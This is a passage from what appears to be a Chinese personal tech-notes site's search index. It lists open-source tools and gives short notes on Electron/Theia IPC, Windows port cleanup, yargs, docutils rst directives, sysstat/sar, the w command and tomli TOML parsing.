Windows 下网速、内存等监控 这是一个用于显示当前网速、CPU及内存利用率的桌面悬浮窗软件，并支持任务栏显示，支持更换皮肤。 地址: https://github.com/zhongyang219/TrafficMonitor 工具-MacOS listen1_desktop 开源音乐播放器, 桌面版 https://github.com/listen1/listen1_desktop 实际核心是一个chrome拓展, 用electron包了一下 官网: https://listen1.github.io/listen1/ frida 支持跨平台的hook, 比如侵入到一个dll内根据偏移获取内存信息 地址: https://github.com/frida/frida Gitee地址: https://gitee.com/wenph/frida KeyboardShortcuts Mac下三方库: https://github.com/sindresorhus/KeyboardShortcuts 支持便捷的快捷键配置, 但是不支持配置的快捷键执行默认行为 latest Mac端更新软件工具: 官网: https://github.com/mangerlahn/latest 软件旁边有个图标 appStore 图标 表示从 AppStore 下载安装 啤酒 图标 表示从 HomeBrew 下载安装 小星星 图标 表示从 官网 下载安装 BetterDisplay 地址: https://github.com/waydabber/BetterDisplay 屏幕更多可玩性 看提交历史, 开源开源着, 只有个readme了. 后面的是需要付费专业版. 目前下载的版本, 每次休眠中解锁, 亮度最大, 卸载之 MonitorControl 地址: https://github.com/MonitorControl/MonitorControl 开源免费的屏幕设置工具 Quantumult-X 地址: https://github.com/crossutility/Quantumult-X 不确定是否是 QX 源码... QuantumultX 地址: https://github.com/w37fhy/QuantumultX 并不是 QuantumultX 本身, 而是 配置脚本/内容/规则 集合 另发现一个文档教程项目 https://github.com/kjfx/QuantumultX openmtp MacOS 上的开源安卓文件传输软件 地址: https://github.com/ganeshrvel/openmtp 工具-Linux sysstat 地址: https://github.com/sysstat/sysstat Linux系统监控工具 工具-通用 frp 地址: https://github.com/fatedier/frp 内网穿透工具 rst2pdf 将rst文件转换为pdf, 有命令行工具和python包, 但是对中文的支持不好 地址: https://github.com/rst2pdf/rst2pdf 浏览器拓展 uBlock 地址: <https://github.com/gorhill/uBlock> 浏览器隐私拦截拓展, star 43.4k NAS alist 文件云盘存储项目: https://github.com/alist-org/alist/tree/main virtual-dsm 地址: https://github.com/vdsm/virtual-dsm 黑群晖docker MoviePilot 地址: https://github.com/jxxghp/MoviePilot 文档: MoviePilot配置-Nas媒体库自动化管理工具 music-tag-web 地址: https://github.com/xhongc/music-tag-web 音乐标签编辑器，可编辑本地音乐文件的元数据（Editable local music file metadata.） 家庭控制 CasaOS 开源私有云系统 地址: https://github.com/IceWhaleTech/CasaOS 官网: https://casaos.io home-assistant 跟 CasaOS 类似, python写的 地址: https://github.com/home-assistant/core integration 地址: https://github.com/hacs/integration home-assistant 的商店 operating-system 地址: https://github.com/home-assistant/operating-system istoreos 地址: https://github.com/istoreos/istoreos 个人云 官网: https://www.istoreos.com 自动化测试 Airtest 地址: https://github.com/AirtestProject/Airtest 网易开发, 基于Python, 官网: http://airtest.netease.com/ 还有关联的: https://github.com/AirtestProject/Poco https://github.com/appium/appium AI大模型 MaxKB 地址: https://gitee.com/fit2cloud-feizhiyun/MaxKB 知识库问答模型, 需要自己喂文件. 仓库文档: https://github.com/1Panel-dev/MaxKB/wiki/1-安装部署 docker使用 docker run -d --name = maxkb -p 8080 :8080 -v ~/.maxkb:/var/lib/postgresql/data 1panel/maxkb # 用户名: admin # 密码: MaxKB@123.. 注意这只是一个客户端, 模型需要自己配(比如模型的API) 实例-配置Kimi模型. 前三个随便选, Kimi的域名为: https://api.moonshot.cn/v1 API-Token需要自行去Kimi官网控制台配置, 地址: https://platform.moonshot.cn/console/api-keys 官方文档介绍: https://platform.moonshot.cn/docs/api/chat 如果要直接使用, 应用那点演示就行 ml-stable-diffusion 地址: https://github.com/apple/ml-stable-diffusion Stable Diffusion with Core ML on Apple Silicon 字体 noto-cjk 字体: Noto CJK fonts 地址: https://github.com/notofonts/noto-cjk free-font 免费字体库 地址: https://github.com/wordshub/free-font","tags":"杂乱无章","url":"/yq-docs-Chaotic-Some-open-source-and-convenient-GIT-projects.html","loc":"/yq-docs-Chaotic-Some-open-source-and-convenient-GIT-projects.html"},{"title":"Electron","text":"中文官方文档: Electron 28.0.0 最新文档地址: https://www.electronjs.org/zh/docs/latest/ install报错 electron-builder配置生成位置 electron生命周期 一些问题 webstrom中如何进行调试 API 进程结构说明 Theia实际上将进程分为了三种 electron主进程 渲染进程 后端进程(node) 目前没有太明白, 为什么不把 electron主进程 与 后端进程 放在一个进程里. 启动顺序大致为: electron主进程单独在一个容器启动 渲染进程 和 后端进程(node) 由另一个容器启动 一般自定义拓展都是在后面那个容器进行代码编写, 在 theiaExtensions 中一般都是: \"theiaExtensions\": [\n    {\n      \"frontend\": \"lib/browser\",\n      \"backend\": \"lib/backend\",\n    }\n  ], 如果要想写 electron主进程拓展 , 一般的方法是实现 ElectronMainApplicationContribution 贡献点 import { ElectronMainApplicationContribution , ElectronMainApplication } from \"@theia/core/lib/electron-main/electron-main-application\" ; import { MaybePromise } from \"@theia/core/lib/common/types\" ; import { app , ipcMain } from \"@theia/core/electron-shared/electron\" ; import { injectable } from \"@theia/core/shared/inversify\" ; import { CHANNEL_IPC_CONNECTION } from \"@theia/core/lib/electron-common/electron-api\" ; import { IpcConnectionArg } from \"../common/defines\" ; @injectable () export class ExtIpcMainService implements ElectronMainApplicationContribution { onStart ( application : ElectronMainApplication ) : MaybePromise < void > { console . log ( \"===注册 ExtIpcMainService\" ); ipcMain . on ( CHANNEL_IPC_CONNECTION , ( event , data : Uint8Array ) => { const decoder = new TextDecoder (); const args = decoder . decode ( data ); try { // 如果是 json 字符串, 还可以 JSON.parse(args) // 解析失败说明不是自定义的数据 const newArgs : IpcConnectionArg = JSON . parse ( args ); if ( newArgs . quit ) { app . quit () } } catch ( e ){ console . log ( e ); } }) } } 在 package.json 中注册方式为: \"theiaExtensions\": [\n    {\n      \"electronMain\": \"lib/electron-main\"\n    }\n  ], 渲染进程调用主进程 实际上与 Electron 的渲染进程调用主进程一样 在主进程使用 ipcMain.on 模块定义实际的调用 (重复定义 on 可能会导致先定义的事件调用被覆盖) 在 preload.ts 中使用 ipcRenderer.send , 定义 windows 的 api`(如 `windows.ElectronMainApi ), 以触发主进程的调用 在渲染进程中使用 windows.ElectronMainApi.xxx 调用 preload 中的 api 如 // electron-main.ts ipcMain . on ( \"do1\" , ( event , ... args : []) => { if ( args && args [ 0 ] === 'quit' ) { app . quit ()} }) // preload.ts contextBridge . exposeInMainWorld ( 'ElectronMainApi' , { do1 : (... args : []) => { ipcRenderer . send ( 'do1' , ... args ) } }) // renderer.ts windows . ElectronMainApi . do1 ( \"quit\" )","tags":"前端","url":"/yq-docs-front-end-frame-Electron-index.html","loc":"/yq-docs-front-end-frame-Electron-index.html"},{"title":"Windows教程","text":"端口占用进程清理","tags":"操作系统","url":"/yq-docs-operating-system-Windows-tutorial-index.html","loc":"/yq-docs-operating-system-Windows-tutorial-index.html"},{"title":"端口占用进程清理","text":"查找端口对应的pid netstat -aon | findstr \"<端口号>\" 最后一列就是pid, 然后用pid就可以查看时哪个进程占用以及kill tasklist | findstr \"<pid>\" # kill taskkill /T /F /PID <pid>","tags":"操作系统","url":"/yq-docs-operating-system-Windows-tutorial-port-occupied-process-cleanup.html","loc":"/yq-docs-operating-system-Windows-tutorial-port-occupied-process-cleanup.html"},{"title":"JS事件","text":"主要是属于 MouseEvent . 可以通过Dom元素的 addEventListener 和 removeEventListener 增加或者移除事件监听器。 element . addEventListener ( 'click' , function ( event ) { // 处理点击事件 }); element . removeEventListener ( 'click' , function ( event ) { // 移除点击事件监听器 }); event 常用方法: stopPropagation() 和 preventDefault() stopPropagation() 阻止事件向上或向下传播,即停止事件的冒泡或捕获。\n以免触发其他元素的事件处理函数。比如在点击事件中阻止事件向父元素传播。\n但不会影响事件对象本身的其他属性和方法。 preventDefault() 阻止事件的默认行为,即取消事件的默认动作。\n比如在表单的提交事件中阻止表单提交,在链接点击事件中阻止页面跳转等。\n会改变事件对象的默认行为,但不会影响事件的传播。","tags":"前端","url":"/yq-docs-front-end-Conceptual-browser-environment-js-event.html","loc":"/yq-docs-front-end-Conceptual-browser-environment-js-event.html"},{"title":"yargs","text":"npm地址: https://www.npmjs.com/package/yargs 命令行参数处理模块. 安装 npm i yargs 获取命令行参数 传统获取 const Args = process.argv.slice ( 2 ) 解释一下, process.argv 获取命令行内容, 一般的形式都是 node xxx.js [参数列表] ,\n要获取的参数, 下表在 2 以后, 所以直接截取 2 以后的内容就是需要的参数列表了. 使用 yargs 获取 提供有 hideBin , 等价于 process.argv.slice(2) import yargs from 'yargs' import { hideBin } from 'yargs/helpers' const Args = yargs ( hideBin ( process . argv )). argv 现在来构造选项参数, 有两种方式 方式一: 分设置每一个 const argv = yargs ( hideBin ( process . argv )) . option ( 'name' , { alias : 'n' , description : 'Your name' , type : 'string' , demandOption : true }) . option ( 'age' , { alias : 'a' , description : 'Your age' , type : 'number' , default : 30 }) . argv ; console . log ( `Hello, ${ argv . name } ! You are ${ argv . age } years old.` ); 方式二: 一起设置 const argv = yargs ( hideBin ( process . argv )) . options ( { name : { alias : 'n' , description : 'Your name' , type : 'string' , demandOption : true }, age : { alias : 'a' , description : 'Your age' , type : 'number' , default : 30 } } ) . argv ; console . log ( `Hello, ${ argv . name } ! You are ${ argv . age } years old.` );","tags":"前端","url":"/yq-docs-front-end-node-Three--party-library-yargs.html","loc":"/yq-docs-front-end-node-Three--party-library-yargs.html"},{"title":"自定义rst指令","text":"关键字: 自定义指令 rst指令 附, 此前迁移 pelican 写的兼容指令: https://github.com/yanquer/directive_for_sphinx rst指令 通常是继承 .venv/lib/python3.11/site-packages/docutils/parsers/rst/__init__.py 的 Directive , 实现 run 方法, 返回 nodes 子类必须实现的类变量. 以 pelican 中的 code-block 为例 import re from docutils import nodes , utils from docutils.parsers.rst import Directive , directives , roles from pygments import highlight from pygments.formatters import HtmlFormatter from pygments.lexers import TextLexer , get_lexer_by_name import pelican.settings as pys class Pygments ( Directive ): \"\"\"Source code syntax highlighting.\"\"\" required_arguments = 1 optional_arguments = 0 final_argument_whitespace = True option_spec = { \"anchorlinenos\" : directives . flag , \"classprefix\" : directives . unchanged , \"hl_lines\" : directives . unchanged , \"lineanchors\" : directives . unchanged , \"linenos\" : directives . unchanged , \"linenospecial\" : directives . nonnegative_int , \"linenostart\" : directives . nonnegative_int , \"linenostep\" : directives . nonnegative_int , \"lineseparator\" : directives . unchanged , \"linespans\" : directives . unchanged , \"nobackground\" : directives . flag , \"nowrap\" : directives . flag , \"tagsfile\" : directives . unchanged , \"tagurlformat\" : directives . unchanged , } has_content = True def run ( self ): ... required_arguments=0 必填参数的数量. 参数指的是指令后紧跟的字符串, 如 .. code-block:: python 中的 python optional_arguments=0 可选参数数量 注解 若参数数量与实际不一致, 会报错 final_argument_whitespace=False 是否允许在参数包含有空格.\n若不允许, 则在参数中包含空格时, 会被按照空格分割为多个参数. option_spec: dict 指令的属性描述. 比如 code-block 的是这样 from docutils.parsers.rst import Directive , directives , roles option_spec = { \"anchorlinenos\" : directives . flag , \"classprefix\" : directives . unchanged , \"hl_lines\" : directives . unchanged , \"lineanchors\" : directives . unchanged , \"linenos\" : directives . unchanged , \"linenospecial\" : directives . nonnegative_int , \"linenostart\" : directives . nonnegative_int , \"linenostep\" : directives . nonnegative_int , \"lineseparator\" : directives . unchanged , \"linespans\" : directives . unchanged , \"nobackground\" : directives . flag , \"nowrap\" : directives . flag , \"tagsfile\" : directives . unchanged , \"tagurlformat\" : directives . unchanged , } has_content: boolean = False 是否允许包含内容 实例参数 可以理解为, 实现 run 方法时, 可以使用的实例变量 name: string 指令的名称或者类型标识 arguments: [string] 指令的参数列表 options: dict 指令的选项(属性描述) content: string 指令主要内容 lineno: int 当前指令所在的行号 (相对于指令的开始行号) content_offset: int 从指令的开始行计算, 当前行的偏移位置 block_text: string 指令的名称 state state state_machine state_machine reporter reporter 实例 基本通用的一些参数 classes 自定义的 CSS 类名 ids 唯一 ID names 添加名称 rst指令节点说明 将 rst 文本转换为 html , 主要依赖于 python 的 docutils 模块. 设计理念就是将文档的各个部分以节点(node)的形式组织,\n且提供了一些预定义的基础节点, 要自定义指令(directive), 其实就是使用这些基础节点构造复杂节点. 预定义的节点定义在 nodes.py .\n常用预定义节点 literal_block 用于表示预格式化的文本块,通常用于展示代码或其他需要保留原始格式的内容。\n在渲染时,会以等宽字体显示,并保留换行和缩进等格式。 可以通过在文档中使用 :: 或 .. code-block:: 指令来创建 literal_block 节点。 line_block 用于表示一个包含多行文本的块,每一行都保持原始的格式和缩进。\n在渲染时,每一行都会单独显示,并保留原始的行间距和缩进。 可以通过在文档中使用 | 开头的行来创建 line_block 节点。 inline 用于表示文本的一个内联段落。\n通常用于包裹其他节点,如 emphasis 、 strong 或 literal 。 在渲染时一般不会产生任何明显的视觉效果,除非它包裹了其他格式化节点。 problematic 用于表示在文档转换过程中出现的问题或错误。\n当解析器无法正确解释某些输入时,会创建这种节点。 在渲染时通常会以特殊的样式(如红色)突出显示,以便用户识别和修复问题。 generated 用于表示由转换过程生成的内容,而不是直接来自原始文档。\n例如,目录、索引或交叉引用等节点通常都是 generated 节点。 在渲染时,这些节点可能会以特殊的方式显示,以区分它们与原始文档内容。 emphasis 用于表示文本的强调或斜体格式。\n通常用单个星号 * 括起来,例如 emphasis 。 在渲染时通常会显示为斜体字体。 strong 用于表示文本的强调或粗体格式。\n通常用双星号 ** 括起来,例如 strong 。 在渲染时通常会显示为粗体字体。 literal 用于表示原样输出的文本,不会进行任何格式化。\n通常用反引号括起来, 例如 literal 。 在渲染时通常会显示为等宽字体,以表示代码或文件路径等内容。 section 小节, 一般仅需传递 ids 参数 paragraph 段落, 对于其中 rst 语法内容, 正常编译输出. node节点连接方式 加号 +: 使用加号 + 可以将一个节点添加到另一个节点的末尾。 返回一个新的节点,原有的节点不会被修改。 适用于创建新的节点树,而不改变原有的节点结构。 示例: parent_node + child_node append(): append() 方法也可以将一个节点添加到另一个节点的末尾。 直接修改原有的节点,将新节点添加到末尾。 适用于在已有的节点树上进行累积式的修改。 示例: parent_node.append(child_node) insert(index, node): 使用 insert() 方法可以将一个节点插入到父节点的指定位置。 直接修改原有的节点,将新节点插入到指定位置。 适用于需要在特定位置插入节点的情况。 示例: parent_node.insert(0, child_node) 将节点插入到父节点的开头位置。 赋值: 也可以通过赋值的方式将一个节点添加到另一个节点中。 直接修改原有的节点,将新节点替换原有的子节点。 适用于需要替换特定位置的子节点的情况。 示例: parent_node[0] = child_node 将子节点设置为父节点的第一个子节点。","tags":"文档","url":"/yq-doc-lan-rst-directives-custom.html","loc":"/yq-doc-lan-rst-directives-custom.html"},{"title":"cifsiostat","text":"属于 Linux系统常用工具包 ./sysstat工具包 统计CIFS信息","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-cifsiostat.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-cifsiostat.html"},{"title":"iostat","text":"属于 Linux系统常用工具包 ./sysstat工具包 统计设备和分区的CPU信息以及IO信息","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-iostat.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-iostat.html"},{"title":"mpsat","text":"属于 Linux系统常用工具包 ./sysstat工具包 统计处理器相关的信息","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-mpsat.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-mpsat.html"},{"title":"pidstat","text":"属于 Linux系统常用工具包 ./sysstat工具包 统计Linux进程的相关信息：IO、CPU、内存等","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-pidstat.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-pidstat.html"},{"title":"sar","text":"属于 Linux系统常用工具包 ./sysstat工具包 参考: Linux命令之sar——查看服务器某一段时间内的CPU情况【系统性能检测】 sar的监控功能 文件的读写情况 系统调用的使用情况 磁盘I/O的使用情况 CPU的使用统计 内存使用状况 进程活动 IPC【进程间通信】有关的活动 sar命令使用环境 sar使用格式: sar + 命令行选项(可选) + 间隔时间(可选) + 次数(可选） 参数选项 -u 查看cpu负载 显示参数： CPU：所有CPU的统计 %user：用户态的CPU使用统计 %nice：更改过优先级的进程的CPU使用统计 %iowait：CPU等待IO数据的百分比 %steal：虚拟机的vCPU占用的物理CPU的百分比 %idle：空闲的CPU百分比 -q 查看平均负载. -B 查询内存 -r 查询内存 参数显示 kbmemfree 空闲的物理内存大小 kbmemused 使用中的物理内存大小 %memused 物理内存使用率 kbbuffers 内核中作为缓冲区使用的物理内存大小，kbbuffers和kbcached:这两个值就是free命令中的buffer和cache. kbcached 缓存的文件大小 kbcommit 保证当前系统正常运行所需要的最小内存，即为了确保内存不溢出而需要的最少内存（物理内存+Swap分区） commit 这个值是kbcommit与内存总量（物理内存+swap分区）的一个百分比的值 -W 查询内存 -b 查询io -u 查询io -d 查询io sar命令累计统计的实现过程 系统会通过调用 /usr/lib64/sa/ 中的三个工具( sa1 sa2 sadc )来实现，周期地记录当时的系统性能的信息的功能。 sa1 收集并将每天的系统性能的信息写入一个二进制的文件中，它是sadc的前端程序 sa2 收集每天的系统活跃的信息并写入总结性的文件中，其作为 sar的前端程序 sadc 收集系统的动态数据的数据并写入一个二进制的文件中，其作为 sar 工具的后端 sar的日志 sar是由有类似日志切割的功能的，它会依据 /etc/cron.d/sysstat 中的计划任务，将日志放入 /var/log/sa/ 中 注解 其日志为二进制文件，不可使用 more 、 less 、 vim 工具查看，必须使用 sar 或 sadf sar使用 查看某段时间内服务器性能情况. 如使用sar命令查看当天的日志文件 sar -f /var/log/sa/sa15 查看某一段时间的情况. 如查看凌晨2点到3点的cpu负载情况 sar -s 02 :00:00 -e 03 :00:00 查看凌晨2点到3点的系统的平均负载 sar -s 02 :00:00 -e 03 :00:00 -q 查看本月1号的cpu (默认只保存一个月的)\nsar查看性能或其日志时，注意自己的使用的是12还是24小时制, 日志的切割是昨天晚上12点到今天12点为一天 cd /var/log/sa/\nsar -f sa01","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-sar.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-sar.html"},{"title":"sysstat工具包","text":"参考 Linux命令之sar——查看服务器某一段时间内的CPU情况【系统性能检测】 Sysstat：开源免费的 Linux 系统的监控工具 github项目地址: https://github.com/sysstat/sysstat Linux系统常用工具包.\n包含两种类型工具 即时查看工具（iostat、mpsat、sar）； 累计统计工具（sar）. sar 既可以做系统活动情况报告，又可以进行实时查看服务器的性能，还可以做累计统计 相关指令 ./iostat ./mpsat ./sar ./pidstat ./tapstat ./cifsiostat sysstat 还包含使用 cron 或 systemd 执行定时任务的工具（默认的采样时间是10分钟，可以修改。），\n用来收集历史性能和活动数据 sar，统计并保存系统活动信息 sadc， sar 的后端，是系统活动数据的收集器 sa1，收集二进制数据并将其存储在系统活动每日数据文件中，是使用 cron 或 systemd 运行的 sar 前端 sa2，汇总日常系统活动，是使用 cron 或 systemd 运行的 sar 前端 sadf，以多种格式显示 sar 收集的数据，如 CSV、XML、JSON 等，并可以用来与其他程序进行数据交换。 sar收集的系统统计信息包括： 输入/输出和传输速率统计信息 CPU统计信息，包括对虚拟化体系结构的支持 内存、交换空间利用率的统计信息 虚拟内存、分页和故障统计 进程创建活动信息 中断信息统计，包括APIC中断，硬件中断，软件中断 网络统计信息，包括网络接口活动，网络设备故障，IP、TCP、UDP、ICMP协议的流量统计，支持IPv6 光纤通道流量统计 基于软件的网络统计信息 NFS服务器和客户端活动 套接字统计 运行队列和系统负载统计 内核利用率统计信息 交换统计 TTY设备活动 电源管理统计信息 USB设备事件 文件系统利用率（节点和块） 失速信息统计 sysstat 的主要功能包括： 在报告中显示平均统计值。 检测动态创建或注册的新设备（磁盘，网络接口等）。 支持UP和SMP计算机，包括具有超线程或多核处理器的计算机。 支持热插拔CPU和tickless的CPU，自动检测正在动态禁用或启用的处理器。 适用于许多不同的体系结构，无论是32位还是64位。 占用很少的CPU时间（用C编写）。 可以将sar/sadc收集的系统统计信息保存在文件中。 可以以各种不同的格式（CSV，XML，JSON，SVG等）导出由sar/sadc收集的系统统计信息。 iostat 可以显示由用户空间中的驱动程序管理的设备的统计信息。 彩色输出，易于阅读和理解。 国际化支持，systat 已经被翻译为多种不同的语言。 可以自动选择用于显示尺寸的单位，以便于阅读，参阅选项 --human 可以生成SVG图形，并显示在浏览器中。 安装 apt install sysstat 或者使用源码安装 $ git clone git://github.com/sysstat/sysstat # 编译安装： $ cd sysstat\n$ ./configure\n$ make\n$ sudo make install 类Debian系统开启数据收集 编辑 /etc/default/sysstat 配置文件，将 ENABLED=\"false\" 改为 ENABLED=\"true\" ，保存即可 $ sudo vim /etc/default/sysstat 重新启动 syastat 服务： $ sudo service sysstat restart","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-sysstat-utility-package.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-sysstat-utility-package.html"},{"title":"tapstat","text":"属于 Linux系统常用工具包 ./sysstat工具包 统计磁盘驱动器的相关信息","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-tapstat.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-tapstat.html"},{"title":"w","text":"参考 Linux w命令 Linux中的w命令介绍 w命令用于显示目前登入系统的用户信息。 执行这项指令可得知目前登入系统的用户有哪些人，以及他们正在执行的程序。 单独执行 w 指令会显示所有的用户，也可指定用户名称，仅显示某位用户的相关信息。 语法: w [-fhlsuV][用户名称] 参数说明 -f , --from 是否显示 FROM 字段.\n即开启或关闭显示用户从何处登入系统。(Mac不支持) -h , --no-header 不显示各栏位的标题信息列。 -l 使用详细格式列表，此为预设值。 -s , --short 使用短样式输出。\n使用此选项时，不会打印 LOGIN @ , JCPU 和 PCPU 字段。\n即使用简洁格式列表，不显示用户登入时间，终端机阶段作业和程序所耗费的CPU时间。(Mac不支持) -u 忽略执行程序的名称，以及该程序耗费CPU时间的信息。 -V 显示版本信息。 -o , --old-style 使用旧样式输出。\n使用此选项时，当 IDLE ， JCPU 和 PCPU 时间少于一分钟时， 该命令将打印空白。 -i , --ip-addr 强制在 FROM 字段中始终显示IP地址而不是主机名 实例 显示当前用户 显示当前用户登录信息及执行的命令 $ w 10 :22 up 2 days, 8 :45, 2 users, load averages: 6 .71 6 .02 5 .51\nUSER TTY FROM LOGIN@ IDLE WHAT\nyanque console - Thu17 6days -\nyanque s000 - Thu17 1 :26 -zsh 第一行信息输出内容和使用uptime命令输出一样，它包含的列信息说明如下： 10:22 - 当前系统时间. up 2 days,  8:45 - 系统运行时长. 2 users - 登录用户数. load averages: 6.71 6.02 5.51 - 系统过去1，5，15分钟的平均负载信息。\n平均系统负载是对当前正在运行或正在等待磁盘I/O的作业数的度量。\n它基本上告诉您系统在给定间隔内的繁忙程度。 第二行信息包括如下字段说明: USER – 登录用户名. TTY – 登录用户使用的终端名. FROM –登录用户来源的主机名或IP地址. LOGIN@ – 用户登录时长. IDLE – 自用户上一次与终端进行交互以来的空闲时间. JCPU – 附加到tty的所有进程使用的时间. PCPU –用户当前进程所用的时间。 显示在\" WHAT\"字段中的那个. WHAT – 用户当前的进程及选项/参数。 不显示登录位置 w -f 以精简模式显示","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-w.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-w.html"},{"title":"IpcMainEvent","text":"参考: IpcMainEvent Object extends Event 参数 processId: Integer 发送该消息的渲染进程内部的ID frameId: Integer 发送该消息的渲染进程框架的ID（可能是iframe） returnValue: any 如果对此赋值，则该值会在同步消息中返回 sender: WebContent 返回发送消息的 webContents senderFrame: WebFramework Readly 发送此消息的框架 ports: MessagePortMain[] 带有此消息传递的 MessagePort 列表 reply: Function 将 IPC 消息发送到渲染器框架的函数，该渲染器框架发送当前正在处理的原始消息。 您应该使用\"reply\"方法回复发送的消息，以确保回复将转到正确的进程和框架。 channel string ...args any[]","tags":"前端","url":"/yq-docs-front-end-frame-Electron-API-IpcMainEvent.html","loc":"/yq-docs-front-end-frame-Electron-API-IpcMainEvent.html"},{"title":"Electron API","text":"ipcMain","tags":"前端","url":"/yq-docs-front-end-frame-Electron-API-index.html","loc":"/yq-docs-front-end-frame-Electron-API-index.html"},{"title":"ipcMain","text":"导入 import { ipcMain } from 'electron' ipcMain.on 用于在主进程中监听来自渲染进程的异步消息。 当渲染进程发送一个消息时,主进程会接收到并执行相应的回调函数。 ipcMain.on(channel, listener) 注册一个监听器。 channel 字符串,用于标识消息的种类。 listener 回调函数,当接收到消息时会被调用,并接收两个参数: event: IpcMainEvent ...args: [] ipcMain.sender 当主进程接收到来自渲染进程的消息时,可以通过 ipcMain.sender 访问发送消息的渲染进程窗口实例。\n这样可以让主进程在处理消息后,向特定的渲染进程窗口发送回应或其他信息。 在主进程的 ipcMain.on 回调函数中,可以使用 event.sender 来获取发送消息的渲染进程窗口实例。 // main.js ipcMain . on ( 'some-message' , ( event , args ) => { // 在这里,可以使用 event.sender 来获取发送消息的渲染进程窗口实例 event . sender . send ( 'response' , 'Hello from main process!' ); }); 注解 如果消息是从渲染进程的 ipcRenderer.send() 发送的,那么 event.sender 就是发送消息的渲染进程窗口实例。 如果消息是通过其他方式触发的,例如通过菜单或快捷键,那么 event.sender 可能是 null 。 IpcMainEvent","tags":"前端","url":"/yq-docs-front-end-frame-Electron-API-ipcMain.html","loc":"/yq-docs-front-end-frame-Electron-API-ipcMain.html"},{"title":"ipcRenderer","text":"导入 import { ipcRenderer } from 'electron' ipcRenderer.on ipcRenderer.sender 用于在渲染进程中发送异步消息到主进程。 当渲染进程发送一个消息时,主进程会接收到并执行相应的处理逻辑。 ipcRenderer.send(channel, ...args) 发送消息。 channel 参数是一个字符串,用于标识消息的种类。 args 参数是需要传递给主进程的数据。","tags":"前端","url":"/yq-docs-front-end-frame-Electron-API-ipcRenderer.html","loc":"/yq-docs-front-end-frame-Electron-API-ipcRenderer.html"},{"title":"toml文件操作","text":"对于低版本 Python (3.11以下)来说, 可以使用的三方库有 tomli: 只支持toml文件读取, 详见 tomli tomli_w: 只支持toml文件写入, 详见 tomli_w tomlkit: 支持toml文件读写, 注释, 详见 tomlkit 在 Python3.11 中， TOML 支持已经内置在标准库中，\n标准库 tomllib 模块可以读取和解析 TOML 文档 参考: [译]Python 和 TOML：新最好的朋友 (2) 使用Python操作TOML","tags":"后端; python","url":"/yq-docs-rear-end-python-Tutorial-Installation-toml-file-operation.html","loc":"/yq-docs-rear-end-python-Tutorial-Installation-toml-file-operation.html"},{"title":"tomlib","text":"注解 完整说明见 toml文件操作 基本与 tomli 一致, 只支持 toml 文件读取 3.11 版本后才提供此模块","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-tomlib.html","loc":"/yq-docs-rear-end-python-python-standard-library-tomlib.html"},{"title":"tomli","text":"注解 完整说明见 toml文件操作 对于低版本 Python (3.11以下)来说, 可以使用的三方库 tomli 对 toml 文件进行操作.\n而在 Python3.11 中， TOML 支持已经内置在标准库中，\n标准库 tomllib 模块可以读取和解析 TOML 文档 安装 python -m pip install tomli 模块函数 tomli 模块仅公开两个函数： load() 从文件对象加载 TOML 参数支持 parse_float 如何处理浮点数, 默认实现满足使用 64 位浮点数的要求，通常精确到大约 16 位有效数字。大部分情况下这个精度足够了，但是如果您需要更高的精度，您可以使用 Decimal 类型。 >>> import tomli >>> from decimal import Decimal >>> ts = tomli . loads ( ... \"ts = 2_459_772.084027777777778\" , ... parse_float = Decimal , ... )[ \"ts\" ] >>> ts Decimal ( '2459772.084027777777778' ) loads() 从字符串加载 TOML 文档。 parse_float 处理浮点数, 示例 示例文件: # tic_tac_toe.toml [user] player_x . color = \"blue\" player_o . color = \"green\" [constant] board_size = 3 [server] url = \"https://tictactoe.example.com\" load 用 load() 函数加载 TOML 文件： import tomli with open ( \"tic_tac_toe.toml\" , mode = \"rb\" ) as fp : config = tomli . load ( fp ) 查看 config 的内容 >>> config { 'user' : { 'player_x' : { 'color' : 'blue' }, 'player_o' : { 'color' : 'green' }}, 'constant' : { 'board_size' : 3 }, 'server' : { 'url' : 'https://tictactoe.example.com' }} >>> config [ \"user\" ][ \"player_o\" ] { 'color' : 'green' } >>> config [ \"server\" ][ \"url\" ] 'https://tictactoe.example.com' loads >>> import tomli >>> toml_str = \"\"\" ... offset_date-time_utc = 2021-01-12 00:23:45Z ... potpourri = [\"flower\", 1749, { symbol = \"X\", color = \"blue\" }, 1994-02-14] ... \"\"\" >>> tomli . loads ( toml_str ) { 'offset_date-time_utc' : datetime . datetime ( 2021 , 1 , 12 , 0 , 23 , 45 , tzinfo = datetime . timezone . utc ), 'potpourri' : [ 'flower' , 1749 , { 'symbol' : 'X' , 'color' : 'blue' }, datetime . date ( 1994 , 2 , 14 )]} 注解 TOML 时间和日期类型由 Python datetime 的类型表示 区别 load() 和 loads() 之间的一个区别是，当您使用 loads() 时，您使用的是常规字符串而不是字节。\n在这种情况下， tomli 假设您已正确处理编码。 requirements.txt定义 由于 3.11 版本后有内置的处理模块, 所以这样写 tomli >= 1.1.0 ; python_version < \"3.11\" 导入 try : import tomllib except ModuleNotFoundError : import tomli as tomllib toml类型 TOML Python string str integer int float float boolean bool table dict offset date-time datetime.datetime (.tzinfo是datetime.timezone是实例) local date-time datetime.datetime(.tzinfo是None) local date datetime.date local time datetime.time array list 参考: [译]Python 和 TOML：新最好的朋友 (2) 使用Python操作TOML","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-tomli.html","loc":"/yq-docs-rear-end-python-python-three--party-library-tomli.html"},{"title":"tomli_w","text":"注解 完整说明见 toml文件操作 算是对 tomli 的一个补充, 补充了写 toml 文件的操作. 安装 python -m pip install tomli_w 提供函数 类似于 tomli 的 load() 和 loads() 。 dump() 写入文件 dumps() 写入字符串 注解 Python 3.11 中的新 tomllib 库不包括 dump() 和 dumps() 示例 